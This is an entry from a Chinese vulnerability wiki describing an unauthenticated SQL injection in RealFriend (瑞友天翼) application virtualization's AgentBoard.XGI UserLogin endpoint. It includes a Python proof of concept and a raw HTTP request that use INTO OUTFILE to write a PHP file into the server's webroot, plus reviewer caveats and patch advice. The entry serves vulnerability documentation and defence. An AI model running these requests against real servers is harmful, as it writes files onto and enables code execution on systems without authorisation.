---
source: "Threekiii/Vulnerability-Wiki"
title: "瑞友天翼应用虚拟化 AgentBoard UserLogin SQL 注入 outfile执行"
product: "瑞友天翼应用虚拟化"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "文称5.x–7.0.3.1，修复7.0.4.1；固定Windows安装路径/MySQL FILE权限"
prerequisites: "匿名声称"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC%E5%BA%94%E7%94%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E7%B3%BB%E7%BB%9F-AgentBoard.XGI-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
id: "vw-f2213068e5951670ffc7fe23"
entity_id: "ve-f2213068e5951670ffc7fe23"
schema_version: "1"
---

# 瑞友天翼应用虚拟化 AgentBoard UserLogin SQL 注入 outfile执行

## 条目说明

- 对象与具体问题：瑞友天翼应用虚拟化；AgentBoard UserLogin SQLi outfile执行
- 版本、配置及部署条件：文称5.x–7.0.3.1，修复7.0.4.1；固定Windows安装路径/MySQL FILE权限
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Python仅两次200判成功，可能软404/已有文件，必须检查新鲜执行输出而非状态码
- url+'1.php'依赖尾斜杠，首请求url+'/AgentBoard'又可能双斜杠，URL拼接规范缺失
- SQL INTO OUTFILE依赖文件不存在/secure_file_priv与权限，固定Program Files路径不可通用
- 写1.php和手工2.php为变体，落盘无清理；HTTP补丁exe链接应由厂商来源/签名核验，不下载运行

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

瑞友天翼应用虚拟化系统是基于服务器计算架构的应用虚拟化平台，它将用户各种应用软件集中部署到瑞友天翼服务集群，客户端通过 WEB 即可访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等。未经身份认证的远程攻击者可以利用系统中存在的 SQL 注入漏洞，写入后门文件，从而执行远程代码。

### 漏洞影响

```
5.x <= 瑞友天翼应用虚拟化系统 <= 7.0.3.1
```

### 漏洞复现

poc

```
import requests
import sys

url = sys.argv[1]
payload="/AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5C1.php%22+--+-&cmd=UserLogin"
repose = requests.get(url=url+payload)
if repose.status_code ==200:
    a = url + '1.php'
    b = requests.get(url=a)
    if b.status_code == 200:
        print('[+] 漏洞存在，验证地址: {}1.php '.format(url))
```

payload

```http
GET /AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5C2.php%22+--+-&cmd=UserLogin HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: CookieLanguageName=ZH-CN; CookieAuthType=0
Upgrade-Insecure-Requests: 1
```

### 漏洞修复

1. 避免将该系统开放至公网。
2. 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，建议您在升级前做好数据备份工作，避免出现意外，酌情升级至安全版本：http://soft.realor.cn:88/Gwt7.0.4.1.exe


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
